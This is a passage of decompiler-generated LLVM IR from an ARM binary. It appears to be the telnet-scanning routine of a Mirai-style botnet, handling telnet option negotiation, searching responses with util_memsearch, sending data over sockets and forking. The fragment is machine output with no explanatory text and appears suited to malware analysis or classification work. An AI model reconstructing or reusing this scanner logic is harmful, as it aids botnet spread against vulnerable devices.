  %v3_ee40 = or i1 %v9_ee3c, %v2_ee40
  br i1 %v3_ee40, label %dec_label_pc_eeac, label %dec_label_pc_ee44

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ef1c, %bb420, %.thread115, %dec_label_pc_ee38
  %v0_ee44 = load i32, i32* @r6, align 4
  %v1_ee44 = inttoptr i32 %v0_ee44 to i8*
  %v2_ee44 = load i8, i8* %v1_ee44, align 1
  %v3_ee44 = zext i8 %v2_ee44 to i32
  store i32 %v3_ee44, i32* %r3.global-to-local, align 4
  %v2_ee48 = icmp ugt i8 %v2_ee44, -4
  store i1 %v2_ee48, i1* %cpsr_c.global-to-local, align 1
  %v7_ee48 = icmp eq i8 %v2_ee44, -3
  store i1 %v7_ee48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee48, label %.thread107, label %dec_label_pc_ee58

.thread107:                                       ; preds = %dec_label_pc_ee44
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_ee44, align 1
  %v0_ee54.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee54.pr.pr, label %.thread110, label %.thread107.dec_label_pc_ee58thread-pre-split_crit_edge

.thread107.dec_label_pc_ee58thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_ee58.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ee58

dec_label_pc_ee58:                                ; preds = %dec_label_pc_ee44, %.thread107.dec_label_pc_ee58thread-pre-split_crit_edge
  %v0_ee58.pr = phi i32 [ %v0_ee58.pr.pre, %.thread107.dec_label_pc_ee58thread-pre-split_crit_edge ], [ %v3_ee44, %dec_label_pc_ee44 ]
  %v2_ee58 = icmp ugt i32 %v0_ee58.pr, 250
  store i1 %v2_ee58, i1* %cpsr_c.global-to-local, align 1
  %v7_ee58 = icmp eq i32 %v0_ee58.pr, 251
  store i1 %v7_ee58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee58, label %bb416, label %.thread110

bb416:                                            ; preds = %dec_label_pc_ee58
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ee60 = load i32, i32* @r6, align 4
  %v4_ee60 = inttoptr i32 %v3_ee60 to i8*
  store i8 -3, i8* %v4_ee60, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_ee58, %.thread107, %bb416
  %v0_ee64 = load i32, i32* @r4, align 4
  %v1_ee64 = add i32 %v0_ee64, 2
  %v2_ee64 = inttoptr i32 %v1_ee64 to i8*
  %v3_ee64 = load i8, i8* %v2_ee64, align 1
  %v4_ee64 = zext i8 %v3_ee64 to i32
  store i32 %v4_ee64, i32* %r3.global-to-local, align 4
  %v2_ee68 = icmp ugt i8 %v3_ee64, -4
  store i1 %v2_ee68, i1* %cpsr_c.global-to-local, align 1
  %v7_ee68 = icmp eq i8 %v3_ee64, -3
  store i1 %v7_ee68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee68, label %.thread111, label %dec_label_pc_ee78

.thread111:                                       ; preds = %.thread110
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_ee64, align 1
  %v0_ee74.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee74.pr.pr, label %.thread114, label %.thread111.dec_label_pc_ee78thread-pre-split_crit_edge

.thread111.dec_label_pc_ee78thread-pre-split_crit_edge: ; preds = %.thread111
  %v0_ee78.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ee78

dec_label_pc_ee78:                                ; preds = %.thread110, %.thread111.dec_label_pc_ee78thread-pre-split_crit_edge
  %v0_ee78.pr = phi i32 [ %v0_ee78.pr.pre, %.thread111.dec_label_pc_ee78thread-pre-split_crit_edge ], [ %v4_ee64, %.thread110 ]
  %v2_ee78 = icmp ugt i32 %v0_ee78.pr, 250
  store i1 %v2_ee78, i1* %cpsr_c.global-to-local, align 1
  %v7_ee78 = icmp eq i32 %v0_ee78.pr, 251
  store i1 %v7_ee78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee78, label %bb417, label %.thread114

bb417:                                            ; preds = %dec_label_pc_ee78
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ee80 = load i32, i32* @r4, align 4
  %v4_ee80 = add i32 %v3_ee80, 2
  %v5_ee80 = inttoptr i32 %v4_ee80 to i8*
  store i8 -3, i8* %v5_ee80, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_ee78, %.thread111, %bb417
  %v0_ee84 = load i32, i32* @r5, align 4
  %v1_ee84 = add i32 %v0_ee84, 4
  %v2_ee84 = inttoptr i32 %v1_ee84 to i32*
  %v3_ee84 = load i32, i32* %v2_ee84, align 4
  store i32 %v3_ee84, i32* %r0.global-to-local, align 4
  %v0_ee88 = load i32, i32* @r4, align 4
  br label %dec_label_pc_ee90

dec_label_pc_ee90:                                ; preds = %dec_label_pc_f018, %.thread114
  %v0_ee94 = phi i32 [ %v3_f030, %dec_label_pc_f018 ], [ %v3_ee84, %.thread114 ]
  %storemerge4 = phi i32 [ %v2_eedc, %dec_label_pc_f018 ], [ %v0_ee88, %.thread114 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_f018 ], [ 3, %.thread114 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ee94 = call i32 @__libc_send(i32 %v0_ee94, i32 %storemerge4, i32 %storemerge, i32 16384)
  store i32 %v4_ee94, i32* %r0.global-to-local, align 4
  %v0_ee98 = load i32, i32* @r5, align 4
  %v1_ee98 = add i32 %v0_ee98, 24
  %v2_ee98 = inttoptr i32 %v1_ee98 to i32*
  %v3_ee98 = load i32, i32* %v2_ee98, align 4
  store i32 %v3_ee98, i32* %r2.global-to-local, align 4
  %v0_ee9c = load i32, i32* @r7, align 4
  %v1_ee9c = add i32 %v0_ee9c, 3
  store i32 %v1_ee9c, i32* @r7, align 4
  %v3_eea0 = icmp uge i32 %v1_ee9c, %v3_ee98
  store i1 %v3_eea0, i1* %cpsr_c.global-to-local, align 1
  %v9_eea0 = icmp eq i32 %v1_ee9c, %v3_ee98
  store i1 %v9_eea0, i1* %cpsr_z.global-to-local, align 1
  %v0_eea4 = load i32, i32* @r4, align 4
  %v1_eea4 = add i32 %v0_eea4, 3
  store i32 %v1_eea4, i32* @r4, align 4
  %v5_eea8 = icmp slt i32 %v1_ee9c, %v3_ee98
  br i1 %v5_eea8, label %dec_label_pc_ee00, label %dec_label_pc_eeac

dec_label_pc_eeac:                                ; preds = %dec_label_pc_edf8.loopexit, %dec_label_pc_ee00, %dec_label_pc_ee90, %dec_label_pc_ee38, %dec_label_pc_ee0c, %dec_label_pc_edec, %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge
  %v6_eeb4 = phi i32 [ %v0_eee8, %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge ], [ %v0_e694, %dec_label_pc_edec ], [ %v6_eeb4240, %dec_label_pc_ee00 ], [ %v0_ee98, %dec_label_pc_ee90 ], [ %v6_eeb4240, %dec_label_pc_ee38 ], [ %v6_eeb4240, %dec_label_pc_ee0c ], [ %v6_eeb4240, %dec_label_pc_edf8.loopexit ]
  %v0_eeac = phi i32 [ %v0_eeac.pre.pre, %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge ], [ 0, %dec_label_pc_edec ], [ %v1_ee28, %dec_label_pc_ee00 ], [ %v1_ee9c, %dec_label_pc_ee90 ], [ %v1_ee28, %dec_label_pc_ee38 ], [ %v1_ee28, %dec_label_pc_ee0c ], [ %v2_ee28, %dec_label_pc_edf8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eeac = icmp eq i32 %v0_eeac, 0
  store i1 %v2_eeac, i1* %cpsr_z.global-to-local, align 1
  %tmp418 = icmp slt i32 %v0_eeac, 1
  br i1 %tmp418, label %dec_label_pc_ede0, label %bb419

bb419:                                            ; preds = %dec_label_pc_eeac
  store i32 3, i32* %r0.global-to-local, align 4
  %v7_eeb4 = add i32 %v6_eeb4, 12
  %v8_eeb4 = inttoptr i32 %v7_eeb4 to i32*
  store i32 3, i32* %v8_eeb4, align 4
  br label %dec_label_pc_ede0

dec_label_pc_eebc:                                ; preds = %dec_label_pc_ee30
  store i32 %v2_eec0, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_186d8.500 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_eec0, i32* @r0, align 4
  %v0_eed0 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_eedc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_186cf.502 to i32), i32* @r1, align 4
  %v0_eee4 = call i32 @memcpy()
  store i32 %v0_eee4, i32* %r0.global-to-local, align 4
  %v0_eee8 = load i32, i32* @r5, align 4
  %v1_eee8 = add i32 %v0_eee8, 24
  %v2_eee8 = inttoptr i32 %v1_eee8 to i32*
  %v3_eee8 = load i32, i32* %v2_eee8, align 4
  %v0_eeec = load i32, i32* @r4, align 4
  %v1_eeec = add i32 %v0_eeec, 2
  store i32 %v1_eeec, i32* %r2.global-to-local, align 4
  %v0_eef0 = load i32, i32* @sl, align 4
  %v2_eef0 = add i32 %v0_eef0, %v3_eee8
  store i32 %v2_eef0, i32* @r3, align 4
  %v3_eef4 = icmp uge i32 %v2_eef0, %v1_eeec
  store i1 %v3_eef4, i1* %cpsr_c.global-to-local, align 1
  %v9_eef4 = icmp eq i32 %v2_eef0, %v1_eeec
  store i1 %v9_eef4, i1* %cpsr_z.global-to-local, align 1
  %v2_eef8 = xor i1 %v3_eef4, true
  %v3_eef8 = or i1 %v9_eef4, %v2_eef8
  br i1 %v3_eef8, label %dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge, label %dec_label_pc_eefc

dec_label_pc_eebc.dec_label_pc_eeac.loopexit_crit_edge: ; preds = %dec_label_pc_eebc
  %v0_eeac.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_eeac

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eebc
  %v2_eefc = inttoptr i32 %v1_eeec to i8*
  %v3_eefc = load i8, i8* %v2_eefc, align 1
  %v4_eefc = zext i8 %v3_eefc to i32
  store i32 %v4_eefc, i32* %r3.global-to-local, align 4
  %v2_ef00 = icmp ugt i8 %v3_eefc, 30
  store i1 %v2_ef00, i1* %cpsr_c.global-to-local, align 1
  %v7_ef00 = icmp eq i8 %v3_eefc, 31
  store i1 %v7_ef00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef00, label %dec_label_pc_f018, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eefc
  %v1_ef08 = inttoptr i32 %v0_eeec to i8*
  %v2_ef08 = load i8, i8* %v1_ef08, align 1
  %v3_ef08 = zext i8 %v2_ef08 to i32
  store i32 %v3_ef08, i32* %r3.global-to-local, align 4
  %v2_ef0c = icmp ugt i8 %v2_ef08, -4
  store i1 %v2_ef0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef0c = icmp eq i8 %v2_ef08, -3
  store i1 %v7_ef0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef0c, label %.thread115, label %dec_label_pc_ef1c

.thread115:                                       ; preds = %dec_label_pc_ef08
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_ef08, align 1
  %v0_ef18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ef18.pr.pr, label %dec_label_pc_ee44, label %.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge

.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge: ; preds = %.thread115
  %v0_ef1c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ef1c

dec_label_pc_ef1c:                                ; preds = %dec_label_pc_ef08, %.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge
  %v0_ef1c.pr = phi i32 [ %v0_ef1c.pr.pre, %.thread115.dec_label_pc_ef1cthread-pre-split_crit_edge ], [ %v3_ef08, %dec_label_pc_ef08 ]
  %v2_ef1c = icmp ugt i32 %v0_ef1c.pr, 250
  store i1 %v2_ef1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef1c = icmp eq i32 %v0_ef1c.pr, 251
  store i1 %v7_ef1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef1c, label %bb420, label %dec_label_pc_ee44

bb420:                                            ; preds = %dec_label_pc_ef1c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ef24 = load i32, i32* @r4, align 4
  %v4_ef24 = inttoptr i32 %v3_ef24 to i8*
  store i8 -3, i8* %v4_ef24, align 1
  br label %dec_label_pc_ee44

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_ed38, %dec_label_pc_ed50, %dec_label_pc_ed48, %bb414, %dec_label_pc_ed24, %dec_label_pc_ed08, %dec_label_pc_ed1c, %bb413
  %v0_ef2c = phi i32 [ %v1_ecfc, %dec_label_pc_ed24 ], [ %v1_ecfc, %dec_label_pc_ed08 ], [ %v1_ecfc, %dec_label_pc_ed1c ], [ %v1_ecfc, %bb413 ], [ %v1_ed5c, %bb414 ], [ %v1_ed5c, %dec_label_pc_ed48 ], [ %v1_ed5c, %dec_label_pc_ed50 ], [ %v1_ed5c, %dec_label_pc_ed38 ]
  %v1_ef2c = add i32 %v0_ef2c, 1
  store i32 %v1_ef2c, i32* @r7, align 4
  br label %dec_label_pc_edac

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ec48, %dec_label_pc_ec68, %dec_label_pc_ec60, %dec_label_pc_ec58, %bb410, %dec_label_pc_ec34, %dec_label_pc_ec10, %dec_label_pc_ec2c, %dec_label_pc_ec24, %bb409
  %v0_ef34 = phi i32 [ %v1_ec04, %dec_label_pc_ec34 ], [ %v1_ec04, %dec_label_pc_ec10 ], [ %v1_ec04, %dec_label_pc_ec2c ], [ %v1_ec04, %dec_label_pc_ec24 ], [ %v1_ec04, %bb409 ], [ %v1_ec74, %bb410 ], [ %v1_ec74, %dec_label_pc_ec58 ], [ %v1_ec74, %dec_label_pc_ec60 ], [ %v1_ec74, %dec_label_pc_ec68 ], [ %v1_ec74, %dec_label_pc_ec48 ]
  %v1_ef34 = add i32 %v0_ef34, 1
  store i32 %v1_ef34, i32* @r7, align 4
  br label %dec_label_pc_ef38

dec_label_pc_ef38:                                ; preds = %dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge, %dec_label_pc_ef34
  %v0_ef38 = phi i32 [ %v0_ef38.pre, %dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge ], [ %v0_e694, %dec_label_pc_ef34 ]
  %v1_ef38 = inttoptr i32 %v0_ef38 to i32*
  %v2_ef38 = load i32, i32* %v1_ef38, align 4
  store i32 %v2_ef38, i32* %r3.global-to-local, align 4
  %v1_ef3c = add i32 %v0_ef38, 4
  %v2_ef3c = inttoptr i32 %v1_ef3c to i32*
  %v3_ef3c = load i32, i32* %v2_ef3c, align 4
  store i32 %v3_ef3c, i32* %r0.global-to-local, align 4
  %v1_ef40 = add i32 %v2_ef38, 12
  %v2_ef40 = inttoptr i32 %v1_ef40 to i8*
  %v3_ef40 = load i8, i8* %v2_ef40, align 1
  %v4_ef40 = zext i8 %v3_ef40 to i32
  store i32 %v4_ef40, i32* %r2.global-to-local, align 4
  %v1_ef44 = inttoptr i32 %v2_ef38 to i32*
  %v2_ef44 = load i32, i32* %v1_ef44, align 4
  store i32 %v2_ef44, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef4c = call i32 @__libc_send(i32 %v3_ef3c, i32 %v2_ef44, i32 %v4_ef40, i32 16384)
  store i32 %v4_ef4c, i32* %r0.global-to-local, align 4
  %v0_ef50 = load i32, i32* @r5, align 4
  %v1_ef50 = add i32 %v0_ef50, 4
  %v2_ef50 = inttoptr i32 %v1_ef50 to i32*
  %v3_ef50 = load i32, i32* %v2_ef50, align 4
  store i32 %v3_ef50, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef60 = call i32 @__libc_send(i32 %v3_ef50, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_ef68 = load i32, i32* @r5, align 4
  %v2_ef68 = add i32 %v1_ef68, 12
  %v3_ef68 = inttoptr i32 %v2_ef68 to i32*
  store i32 4, i32* %v3_ef68, align 4
  br label %dec_label_pc_ede0

dec_label_pc_ef70:                                ; preds = %dec_label_pc_e738
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_ef7c = call i32 @table_unlock_val(i32 9)
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_ef8c = call i32 @table_retrieve_val(i32 9, i32* nonnull %v2_ecac)
  store i32 %v3_ef8c, i32* %r0.global-to-local, align 4
  %v3_ef90 = load i8, i8* %stack_var_-56, align 1
  %v4_ef90 = sext i8 %v3_ef90 to i32
  store i32 %v3_ef8c, i32* %r2.global-to-local, align 4
  %v1_ef98 = add nsw i32 %v4_ef90, -1
  store i32 %v1_ef98, i32* %r3.global-to-local, align 4
  %v0_ef9c = load i32, i32* @r5, align 4
  %v1_ef9c = add i32 %v0_ef9c, 24
  %v2_ef9c = inttoptr i32 %v1_ef9c to i32*
  %v3_ef9c = load i32, i32* %v2_ef9c, align 4
  store i32 %v3_ef9c, i32* %r1.global-to-local, align 4
  %v0_efa0 = load i32, i32* @sl, align 4
  store i32 %v0_efa0, i32* %r0.global-to-local, align 4
  %v4_efa4 = call i32 @util_memsearch(i32 %v0_efa0, i32 %v3_ef9c, i32 %v3_ef8c, i32 %v1_ef98)
  store i32 %v4_efa4, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_efb0 = call i32 @table_lock_val(i32 9)
  store i32 %v1_efb0, i32* %r0.global-to-local, align 4
  %v0_efb4 = load i32, i32* @r7, align 4
  %v2_efb4 = icmp eq i32 %v0_efb4, -1
  store i1 %v2_efb4, i1* %cpsr_c.global-to-local, align 1
  %v7_efb4 = icmp eq i32 %v0_efb4, -1
  store i1 %v7_efb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efb4, label %dec_label_pc_e614.loopexit, label %dec_label_pc_efbc

dec_label_pc_efbc:                                ; preds = %dec_label_pc_ef70
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efbc = icmp eq i32 %v0_efb4, 0
  store i1 %v2_efbc, i1* %cpsr_z.global-to-local, align 1
  %tmp421 = icmp slt i32 %v0_efb4, 1
  br i1 %tmp421, label %dec_label_pc_ede0, label %dec_label_pc_efc4

dec_label_pc_efc4:                                ; preds = %dec_label_pc_efbc
  %v0_efc4 = load i32, i32* @r5, align 4
  %v1_efc4 = add i32 %v0_efc4, 20
  %v2_efc4 = inttoptr i32 %v1_efc4 to i16*
  %v3_efc4 = load i16, i16* %v2_efc4, align 2
  %v4_efc4 = zext i16 %v3_efc4 to i32
  store i32 %v4_efc4, i32* %r3.global-to-local, align 4
  %v1_efc8 = add i32 %v0_efc4, 16
  %v2_efc8 = inttoptr i32 %v1_efc8 to i32*
  %v3_efc8 = load i32, i32* %v2_efc8, align 4
  store i32 %v3_efc8, i32* %r2.global-to-local, align 4
  store i32 %v2_efcc, i32* @lr, align 4
  store i32 %v4_efc4, i32* %stack_var_-42, align 4
  store i32 %v3_efc8, i32* %stack_var_-60, align 4
  %v1_efd8 = inttoptr i32 %v0_efc4 to i32*
  %v2_efd8 = load i32, i32* %v1_efd8, align 4
  store i32 %v2_efd8, i32* @r8, align 4
  %v0_efdc = call i32 @__libc_fork()
  store i32 %v0_efdc, i32* %r0.global-to-local, align 4
  %v7_efe0 = icmp eq i32 %v0_efdc, -1
  %.432 = zext i1 %v7_efe0 to i32
  store i32 %.432, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efec = icmp eq i32 %v0_efdc, 0
  store i1 %v2_efec, i1* %cpsr_z.global-to-local, align 1
  %tmp424 = icmp slt i32 %v0_efdc, 1
  br i1 %tmp424, label %bb425, label %.thread121

.thread121:                                       ; preds = %dec_label_pc_efc4
  store i32 1, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f000

bb425:                                            ; preds = %dec_label_pc_efc4
  store i32 %.432, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eff8 = icmp eq i1 %v7_efe0, false
  store i1 %v2_eff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eff8, label %dec_label_pc_f1e4, label %dec_label_pc_f000

dec_label_pc_f000:                                ; preds = %.thread121, %bb425
  %v0_f000 = load i32, i32* @r5, align 4
  %v1_f000 = add i32 %v0_f000, 4
  %v2_f000 = inttoptr i32 %v1_f000 to i32*
  %v3_f000 = load i32, i32* %v2_f000, align 4
  store i32 %v3_f000, i32* %r0.global-to-local, align 4
  %v1_f004 = call i32 @__GI___libc_close(i32 %v3_f000)
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_f00c = load i32, i32* @r4, align 4
  %v1_f00c = load i32, i32* @r5, align 4
  %v2_f00c = add i32 %v1_f00c, 4
  %v3_f00c = inttoptr i32 %v2_f00c to i32*
  store i32 %v0_f00c, i32* %v3_f00c, align 4
  %v0_f010 = load i32, i32* %r0.global-to-local, align 4
  %v1_f010 = load i32, i32* @r5, align 4
  %v2_f010 = add i32 %v1_f010, 12
  %v3_f010 = inttoptr i32 %v2_f010 to i32*
  store i32 %v0_f010, i32* %v3_f010, align 4
  br label %dec_label_pc_ede0

dec_label_pc_f018:                                ; preds = %dec_label_pc_eefc
  store i32 %v2_eec0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f024 = add i32 %v0_eee8, 4
  %v2_f024 = inttoptr i32 %v1_f024 to i32*
  %v3_f024 = load i32, i32* %v2_f024, align 4
  store i32 %v3_f024, i32* %r0.global-to-local, align 4
  %v4_f028 = call i32 @__libc_send(i32 %v3_f024, i32 %v2_eec0, i32 3, i32 16384)
  store i32 %v4_f028, i32* %r0.global-to-local, align 4
  store i32 %v2_eed4, i32* %r1.global-to-local, align 4
  %v0_f030 = load i32, i32* @r5, align 4
  %v1_f030 = add i32 %v0_f030, 4
  %v2_f030 = inttoptr i32 %v1_f030 to i32*
  %v3_f030 = load i32, i32* %v2_f030, align 4
  store i32 %v3_f030, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee90

dec_label_pc_f040:                                ; preds = %dec_label_pc_e620
  store i32 %.pre, i32* @r0, align 4
  %v1_f048 = add i32 %v0_f040, 92
  store i32 %v1_f048, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_f050 = call i32 @memmove(i32 %.pre, i32 %v1_f048, i32 192)
  store i32 %v3_f050, i32* %r0.global-to-local, align 4
  %v0_f054 = load i32, i32* @r5, align 4
  %v1_f054 = add i32 %v0_f054, 24
  %v2_f054 = inttoptr i32 %v1_f054 to i32*
  %v3_f054 = load i32, i32* %v2_f054, align 4
  %v1_f058 = add i32 %v3_f054, -64
  store i32 %v1_f058, i32* %r3.global-to-local, align 4
  store i32 %v1_f058, i32* %v2_f054, align 4
  br label %dec_label_pc_e630

dec_label_pc_f064:                                ; preds = %dec_label_pc_e774
  %v0_f064 = load i32, i32* @r5, align 4
  store i32 %v0_f064, i32* @r0, align 4
  %v0_f068 = call i32 @setup_connection()
  store i32 %v0_f068, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e7b0

dec_label_pc_f070:                                ; preds = %dec_label_pc_ec7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f070 = load i8, i8* %stack_var_-56, align 1
  %v4_f070 = sext i8 %v3_f070 to i32
  %v0_f074 = load i32, i32* @r6, align 4
  store i32 %v0_f074, i32* %r2.global-to-local, align 4
  %v1_f078 = add nsw i32 %v4_f070, -1
  store i32 %v1_f078, i32* %r3.global-to-local, align 4
  %v0_f07c = load i32, i32* @sl, align 4
  store i32 %v0_f07c, i32* %r0.global-to-local, align 4
  %v0_f080 = load i32, i32* @r5, align 4
  %v1_f080 = add i32 %v0_f080, 24
  %v2_f080 = inttoptr i32 %v1_f080 to i32*
  %v3_f080 = load i32, i32* %v2_f080, align 4
  store i32 %v3_f080, i32* %r1.global-to-local, align 4
  %v4_f084 = call i32 @util_memsearch(i32 %v0_f07c, i32 %v3_f080, i32 %v0_f074, i32 %v1_f078)
  store i32 %v4_f084, i32* %r0.global-to-local, align 4
  %v1_f088 = add i32 %v4_f084, 1
  store i32 %v1_f088, i32* @r7, align 4
  %v2_f088 = icmp eq i32 %v4_f084, -1
  store i1 %v2_f088, i1* %cpsr_c.global-to-local, align 1
  %v7_f088 = icmp eq i32 %v1_f088, 0
  store i1 %v7_f088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f088, label %dec_label_pc_f098, label %dec_label_pc_ecdc

dec_label_pc_f098:                                ; preds = %dec_label_pc_f070
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_f09c = call i32 @table_lock_val(i32 12)
  store i32 13, i32* %r0.global-to-local, align 4
  %v1_f0a4 = call i32 @table_lock_val(i32 13)
  store i32 %v1_f0a4, i32* %r0.global-to-local, align 4
  %v0_f0a8 = load i32, i32* @r5, align 4
  %v1_f0a8 = add i32 %v0_f0a8, 12
  %v2_f0a8 = inttoptr i32 %v1_f0a8 to i32*
  %v3_f0a8 = load i32, i32* %v2_f0a8, align 4
  store i32 %v3_f0a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e618.backedge

dec_label_pc_e618.backedge.thread:                ; preds = %dec_label_pc_e7dc, %dec_label_pc_e8b0, %dec_label_pc_e984, %dec_label_pc_ea58, %dec_label_pc_eb2c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e620

dec_label_pc_e618.backedge.thread528:             ; preds = %dec_label_pc_eb90, %dec_label_pc_e9e8, %dec_label_pc_e914, %dec_label_pc_eabc, %dec_label_pc_e840
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e620

dec_label_pc_e618.backedge:                       ; preds = %dec_label_pc_e694, %dec_label_pc_f098, %dec_label_pc_f19c
  %v0_e620186 = phi i32 [ %v0_f1a4, %dec_label_pc_f19c ], [ %v0_f0a8, %dec_label_pc_f098 ], [ %v0_e694, %dec_label_pc_e694 ]
  %v0_e618.be = phi i32 [ %v3_f1a4, %dec_label_pc_f19c ], [ %v3_f0a8, %dec_label_pc_f098 ], [ %v3_e694, %dec_label_pc_e694 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e618 = icmp eq i32 %v0_e618.be, 0
  store i1 %v2_e618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e618, label %dec_label_pc_e720, label %dec_label_pc_e620

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_e5d0
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_eca4, i32* %r3.global-to-local, align 4
  store i32 %v2_ec90, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  store i32 4, i32* %stack_var_-60, align 4
  %v5_f0dc = call i32 @getsockopt(i32 %v3_e5c4, i32 1, i32 4, i32 %v2_eca4, i32 %v2_ec90)
  %v3_f0e0 = load i8, i8* %stack_var_-56, align 1
  %v4_f0e0 = sext i8 %v3_f0e0 to i32
  store i32 %v4_f0e0, i32* %r3.global-to-local, align 4
  %v2_f0e4 = or i32 %v4_f0e0, %v5_f0dc
  store i32 %v2_f0e4, i32* %r0.global-to-local, align 4
  %v4_f0e4 = icmp eq i32 %v2_f0e4, 0
  store i1 %v4_f0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f0e4, label %dec_label_pc_f0ec, label %dec_label_pc_f180

dec_label_pc_f0ec:                                ; preds = %dec_label_pc_f0b0
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f0f0 = load i32, i32* @r5, align 4
  %v2_f0f0 = add i32 %v1_f0f0, 12
  %v3_f0f0 = inttoptr i32 %v2_f0f0 to i32*
  store i32 2, i32* %v3_f0f0, align 4
  %v0_f0f4 = call i32 @rand_next()
  %v2_f0fc = load i16, i16* bitcast (i16** @global_var_20f60.125 to i16*), align 4
  %v3_f0fc = zext i16 %v2_f0fc to i32
  %v2_f100 = udiv i32 %v0_f0f4, %v3_f0fc
  %v3_f100 = urem i32 %v0_f0f4, %v3_f0fc
  store i32 %v2_f100, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20f30.121 to i32), i32* %r3.global-to-local, align 4
  %v2_f108 = load i32, i32* @global_var_20f30.121, align 4
  store i32 %v2_f108, i32* %ip.global-to-local, align 4
  %v1_f110 = load i32, i32* @r4, align 4
